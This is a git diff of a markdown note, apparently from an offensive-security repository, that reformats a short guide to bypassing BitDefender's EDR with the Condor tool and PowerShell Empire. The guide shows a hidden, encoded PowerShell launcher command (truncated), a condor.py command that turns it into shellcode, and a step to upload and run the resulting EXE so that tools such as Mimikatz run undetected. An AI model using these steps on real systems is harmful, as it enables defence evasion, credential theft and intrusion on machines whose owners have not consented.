@@ -1,4 +1,6 @@
-# Using Condor + Powershell Empire
+# BitDefender
+
+## Using Condor + Powershell Empire
 
 The [condor](https://github.com/MrEmpy/Condor) tool is also able to bypass BitDefender's EDR, including running Powershell Empire's own tools without any interruption, such as Mimikatz.
 
@@ -8,16 +10,16 @@ The [condor](https://github.com/MrEmpy/Condor) tool is also able to bypass BitDe
 powershell -Sta -Nop -Window Hidden -EncodedCommand cwB2ACAAbwAgACg...
 ```
 
-2. Run the condor tool with the following command:
+1. Run the condor tool with the following command:
 
 ```
 python3 condor.py -p windows/x64/exec
 ```
 
-3. Paste the Powershell payload to generate the shellcode
+1. Paste the Powershell payload to generate the shellcode
 
-![](Images/bitdefender2.png)
+![](<../BitDefender Endpoint Security Tool/Images/bitdefender2.png>)
 
-4. Upload the EXE to the machine and run.
+1. Upload the EXE to the machine and run.
 
-![](Images/bitdefender.png)
+![](<../BitDefender Endpoint Security Tool/Images/bitdefender.png>)
